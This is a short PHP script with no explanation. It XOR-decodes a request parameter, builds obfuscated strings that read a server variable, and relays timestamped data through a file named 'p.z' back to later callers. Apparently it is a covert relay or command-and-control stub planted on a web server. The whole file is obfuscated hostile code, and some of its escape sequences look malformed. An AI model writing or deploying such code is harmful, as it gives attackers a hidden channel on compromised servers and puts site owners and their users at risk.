<?php
function enc(&$x) { for ($i = 0; $i < strlen($x); $i++) { $x[$i] = chr(ord($x[$i]) ^ ((($i + 101) * 43) % 256)); } }
$a = (isset($_REQUEST['a']) ? (string)$_REQUEST['a'] : null);
if (!$a) die();
enc($a);
$a = explode(';',$a);
if (count($a) < 2) die();
if ((int)$a[0] < 1000) {
  $r = "J9\12\211\244\214\11";
  enc($r);
  $z = "\191v\25\40\252\134\182w\27";
  enc($z);
  $r .= $_SERVER[$z];
  unset($z);
  enc($r);
  $r .= "\216F\34\15\205\162\150E\43U\196\225\203\22\96R\205\162\154";
  echo base64_encode(chr(6).$r);
  exit();
}
$f = file_get_contents('p.z');
enc($f);
$f = explode(' ',$f);
if ((count($f) < 2) || ((int)$f[0]+650 < time())) {
$r = chr(7);
echo base64_encode($r);
} else {
echo base64_encode(chr(8).$f[1]);
}
if ($a[1] != '0') {
$r = time().' '.$a[1];
enc($r);
file_put_contents('p.z',$r);
} else {
file_put_contents('p.z','');
}
?>